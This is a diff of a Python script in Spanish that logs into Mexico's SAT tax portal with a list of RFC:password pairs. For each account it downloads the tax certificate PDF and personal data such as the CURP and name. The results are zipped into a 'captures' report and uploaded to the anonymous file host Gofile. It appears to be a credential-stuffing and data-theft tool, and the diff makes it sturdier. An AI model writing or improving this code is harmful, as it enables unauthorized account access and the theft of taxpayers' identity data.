@@ -16,69 +16,100 @@ def run():
     reporte_txt = "=== REPORTE DETALLADO DE CAPTURAS ===\n\n"
 
     with open("usuarios.txt", "r") as f:
-        usuarios = [line.strip() for line in f if ":" in line]
+        lineas = f.readlines()
 
-    for usuario in usuarios:
-        rfc, pwd = usuario.split(":")
-        rfc = rfc.upper().strip()
+    for num_linea, linea in enumerate(lineas, 1):
+        linea = linea.strip()
+        if not linea or ":" not in linea:
+            continue
+        
+        # Corrección del error: maxsplit=1 por si la contraseña tiene ":"
+        partes = linea.split(":", 1)
+        if len(partes) != 2:
+            print(f"?? Saltando línea {num_linea}: Formato incorrecto")
+            continue
+            
+        rfc, pwd = partes
+        rfc = rfc.strip().upper()
+        pwd = pwd.strip()
+
         print(f"?? Procesando: {rfc}")
 
         # 1. AUTENTICACIÓN
-        token_url = f"https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token?grant_type=password&client_id={CLIENT_ID}&client_secret={CLIENT_SECRET}&username={rfc}&password={pwd}&scope=satmovil&resourceServer=satmovil"
+        token_url = "https://login.cloudb.sat.gob.mx/nidp/oauth/nam/token"
+        params = {
+            "grant_type": "password",
+            "client_id": CLIENT_ID,
+            "client_secret": CLIENT_SECRET,
+            "username": rfc,
+            "password": pwd,
+            "scope": "satmovil",
+            "resourceServer": "satmovil"
+        }
+        
         try:
-            r_auth = session.post(token_url)
-            token = r_auth.json().get("access_token")
+            # Usamos params en lugar de pegarlo en la URL para evitar errores de caracteres
+            r_auth = session.post(token_url, params=params, timeout=15)
+            data_token = r_auth.json()
+            token = data_token.get("access_token")
             
             if not token:
-                print(f"  [!] Falló login para {rfc}")
+                print(f"  [!] Falló login para {rfc}: {data_token.get('error_description', 'Credenciales incorrectas')}")
                 continue
 
             headers = {"Authorization": f"bearer {token}", "User-Agent": "Dart/3.5 (dart:io)"}
 
             # 2. DESCARGA DE PDF
-            res_pdf = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}", headers=headers)
+            res_pdf = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/csf/{rfc}", headers=headers, timeout=15)
             pdf_data = res_pdf.json().get("constancia")
             if pdf_data:
                 with open(f"PDFS_SAT/{rfc}.pdf", "wb") as f_pdf:
                     f_pdf.write(base64.b64decode(pdf_data))
                 print(f"  [+] PDF Guardado")
 
-            # 3. CAPTURA DE INFORMACIÓN COMPLETA
-            res_info = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}", headers=headers)
+            # 3. CAPTURA DE INFORMACIÓN
+            res_info = session.get(f"https://sm-sat-movilzuul-sm-servicios-moviles.cnh.cloudb.sat.gob.mx/satmovil/v1/dwh/miinformacion/{rfc}", headers=headers, timeout=15)
             info = res_info.json()
 
-            # Mismo orden que tu script original
             datos = (
                 f"RFC: {rfc}\n"
                 f"NOMBRE: {info.get('tradename', 'N/A')}\n"
                 f"CURP: {info.get('curp', 'N/A')}\n"
-                f"DIRECCIÓN: {info.get('street', '')} #{info.get('numExterior', '')}, Col. {info.get('colonia', '')}, CP: {info.get('zipcode', '')}\n"
-                f"LOCALIDAD: {info.get('municipio', '')}, {info.get('descriptionFederal', '')}\n"
                 f"STATUS: {info.get('statusDescription', 'N/A')}\n"
                 f"-------------------------------------------\n"
             )
             reporte_txt += datos
 
         except Exception as e:
-            print(f"  [!] Error en {rfc}: {e}")
+            print(f"  [!] Error inesperado en {rfc}: {e}")
 
     # 4. CREAR ZIP Y SUBIR
-    with open("REPORTE_CAPTURAS.txt", "w", encoding="utf-8") as f_rep:
-        f_rep.write(reporte_txt)
+    if os.listdir("PDFS_SAT") or len(reporte_txt) > 50:
+        with open("REPORTE_CAPTURAS.txt", "w", encoding="utf-8") as f_rep:
+            f_rep.write(reporte_txt)
 
-    zip_name = "TODO_SAT.zip"
-    with zipfile.ZipFile(zip_name, 'w') as zipf:
-        zipf.write("REPORTE_CAPTURAS.txt")
-        for arch in os.listdir("PDFS_SAT"):
-            zipf.write(f"PDFS_SAT/{arch}", f"PDFS/{arch}")
+        zip_name = "TODO_SAT.zip"
+        with zipfile.ZipFile(zip_name, 'w') as zipf:
+            if os.path.exists("REPORTE_CAPTURAS.txt"):
+                zipf.write("REPORTE_CAPTURAS.txt")
+            for arch in os.listdir("PDFS_SAT"):
+                zipf.write(f"PDFS_SAT/{arch}", f"PDFS/{arch}")
 
-    print("\n?? Subiendo todo a Gofile...")
-    server = requests.get("https://api.gofile.io/servers").json()["data"]["servers"][0]["name"]
-    with open(zip_name, "rb") as f_zip:
-        up = requests.post(f"https://{server}.gofile.io/contents/uploadfile", files={"file": f_zip}).json()
-    
-    print(f"\n? TERMINADO CON ÉXITO")
-    print(f"?? LINK GOFILE: {up['data']['downloadPage']}")
+        print("\n?? Subiendo todo a Gofile...")
+        try:
+            server_info = requests.get("https://api.gofile.io/servers").json()
+            server = server_info["data"]["servers"][0]["name"]
+            with open(zip_name, "rb") as f_zip:
+                up = requests.post(f"https://{server}.gofile.io/contents/uploadfile", files={"file": f_zip}).json()
+            
+            if up["status"] == "ok":
+                print(f"\n? LINK GOFILE: {up['data']['downloadPage']}")
+            else:
+                print("? Error al subir a Gofile")
+        except:
+            print("? Error de conexión con Gofile")
+    else:
+        print("? No se obtuvo información de ninguna cuenta.")
 
 if __name__ == "__main__":
     run()
